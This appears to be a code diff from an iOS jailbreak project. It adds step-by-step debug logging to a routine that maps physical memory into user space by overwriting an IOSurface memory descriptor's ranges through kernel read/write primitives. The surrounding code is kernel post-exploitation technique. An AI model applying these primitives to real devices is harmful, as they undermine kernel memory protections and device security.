@@ -152,14 +152,28 @@ unsigned cleanupsCount = 0;
 
 int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
 {
+	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
+	// uniform across all 8 census windows; this names the failing step.
+	// No control-flow changes: only observations (plus a NULL-port guard
+	// that only matters in the already-failing case).
+	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
+	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
 	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
-
+	if (!surfaceMachPort) {
+		jb_tr_beacon("KMAP fail,noport");
+		return -1;
+	}
 	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
 	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
 	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
 	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
+	jb_tr_beacon("KMAP step1,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
+	             (unsigned long long)surfaceSendRight,
+	             (unsigned long long)surface,
+	             (unsigned long long)desc, (unsigned long long)ranges);
 
 	if (gPrimitives.krwMinSafeReadSize > 0x10) {
+		jb_tr_beacon("KMAP path,fakeranges,minsafe=%x", gPrimitives.krwMinSafeReadSize);
 		// If the primitive we have cannot read <=0x10 bytes at a time, we need to create our own struct
 		// And later clean it up when we have a better primitive in IOSurface_map_cleanup
 		uint64_t *fakeRanges = malloc(2 * sizeof(uint64_t));
@@ -167,6 +181,7 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		fakeRanges[1] = size;
 
 		uint64_t fakeRanges_kva = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
+		jb_tr_beacon("KMAP fakeranges,kva=%llx", (unsigned long long)fakeRanges_kva);
 		IOMemoryDescriptor_set_ranges(desc, fakeRanges_kva);
 		cleanups = realloc(cleanups, ++cleanupsCount * sizeof(struct IOSurface_toCleanup));
 		cleanups[cleanupsCount-1].descriptor = desc;
@@ -192,7 +207,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	IOMemoryDescriptor_set_memRef(desc, 0);
 
 	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
-	*uaddr = IOSurfaceGetBaseAddress(mappedSurfaceRef);
+	void *mappedBase = IOSurfaceGetBaseAddress(mappedSurfaceRef);
+	jb_tr_beacon("KMAP step2,lookup=%d,base=%llx",
+	             mappedSurfaceRef != NULL,
+	             (unsigned long long)(uintptr_t)mappedBase);
+	*uaddr = mappedBase;
 	return 0;
 }
 
